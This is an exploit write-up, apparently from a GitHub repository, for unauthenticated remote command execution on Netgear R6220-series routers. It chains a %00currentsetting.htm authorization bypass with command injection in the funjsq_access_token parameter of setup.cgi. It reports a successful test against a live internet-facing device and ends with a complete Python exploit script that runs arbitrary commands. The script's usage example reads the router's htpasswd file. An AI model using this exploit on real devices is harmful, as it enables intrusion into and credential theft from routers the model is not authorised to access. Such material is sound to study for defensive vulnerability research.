# netgearR6220

There is an unauthorized connection in NetGear 6200, but the unauthorized connection is too weak. Want to find a command to execute, combined to use, so there is this article.
The unauthorized exp here is simple,
```
http://83.251.186.xxx/index.htm%00currentsetting.htm
```
Just adding %00currentsetting.htm to the url bypasses the authorization check. The principle here https://github.com/theRaz0r/Iot-vulnerability/blob/main/Netgear/DGN1000_unauthorized_comamnd_injection/DGN1000_unauthorized_comamnd_injection.md has been analyzed in detail.




---


## Command execution

![](vx_images/581632855402960.png)
![](vx_images/402743549525060.png)
todo=funjsq_login calls the sub_406790 function, and the funjsq_access_token in it causes the command to execute.

Dynamic debugging
![](vx_images/50594073009872.png)

![](vx_images/464842752139221.png)
When executing command, check the value of the s0 register
![](vx_images/202371524866445.png)
Found our value has come in.
He'll execute it here
COMMAND("/tmp/funjsq/bin/funjsq.sh login 123465789|ls>1")

---
# Online test
Because the simulation doesn't work, find an online machine to test it

![](vx_images/363397894279190.png)

The signal was successfully received here
![](vx_images/474649059353417.png)

The unauthorized RCE successfully completed.

---


exp.py

```
import requests
import sys

# Define the function to perform the attack

def attack(target_ip, cmd):
    try:
        # 构造攻击的URL
        burp0_url = f"http://{target_ip}:8080/setup.cgi?todo=funjsq_login&funjsq_access_token=12345|{cmd}&test=11%00currentsetting.htm"
        burp0_headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "close",
           
        }

        # 发送带有头部信息的GET请求到目标URL，并设置超时时间为5秒
        response = requests.get(burp0_url, headers=burp0_headers, timeout=5)

        # 检查响应状态码是否为200（OK）
        if response.status_code == 200:
            print("Response content:")
            print(response.text)
        else:
            print("Request failed with status code:", response.status_code)
    except requests.exceptions.Timeout:
        print("Request timed out after 5 seconds.")
    except Exception as e:
        print(f"Error: {e}")

# 使用示例
# attack('192.168.1.1', 'ls -la')

# Check if the script is run directly (not imported as a module)
if __name__ == "__main__":
    # Check if the correct number of command line arguments is provided
    if len(sys.argv) != 3:
        print("Usage: python exp.py target_ip \"command\"")
        sys.exit(1)

    # Read the target IP and command from command line arguments
    host = sys.argv[1]  # The target IP address, for example "151.71.83.247"
    payload = sys.argv[2]  # The command to execute, for example "cat%20/tmp/etc/htpasswd"

    print(f"Target: {host}")
    print(f"Payload: {payload}")
    
    # Call the attack function with the provided arguments
    attack(host, payload)
```





